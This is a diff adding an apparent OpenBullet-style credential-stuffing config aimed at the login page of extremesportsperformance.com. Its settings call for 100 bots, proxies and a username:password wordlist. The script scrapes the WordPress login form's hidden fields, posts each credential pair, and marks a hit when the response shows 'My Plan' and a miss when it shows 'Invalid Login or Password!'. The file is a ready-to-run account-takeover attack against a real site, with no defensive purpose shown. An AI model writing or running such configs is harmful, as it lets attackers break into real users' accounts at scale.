@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "extreme sports",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-25T02:42:44.0201351+00:00",
+  "AdditionalInfo": "",
+  "Author": "joejoe402012",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "http://www.extremesportsperformance.com/login/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_WPC_LOGIN PARSE "<SOURCE>" CSS "[name=wpc_login]" "value" 0 -> VAR "WPC_LOGIN" "" "" 
+#PARSE_REMEMBERME PARSE "<SOURCE>" CSS "[name=rememberme]" "value" 0 -> VAR "REMEMBERME" "" "" 
+#PARSE_WP-SUBMIT PARSE "<SOURCE>" CSS "[name=wp-submit]" "value" 0 -> VAR "WP-SUBMIT" "" "" 
+#PARSE_REDIRECT_TO PARSE "<SOURCE>" CSS "[name=redirect_to]" "value" 0 -> VAR "REDIRECT_TO" "" "" 
+#POST_LOGIN REQUEST POST "http://www.extremesportsperformance.com/login" AutoRedirect=TRUE 
+  CONTENT "log=<USER>&pwd=<PASS>&wpc_login=<WPC_LOGIN>&rememberme=<REMEMBERME>&wp-submit=<WP-SUBMIT>&redirect_to=<REDIRECT_TO>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: http://www.extremesportsperformance.com" 
+  HEADER "Referer: http://www.extremesportsperformance.com/login/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid Login or Password!" 
+  KEYCHAIN Success OR 
+    KEY "My Plan" 
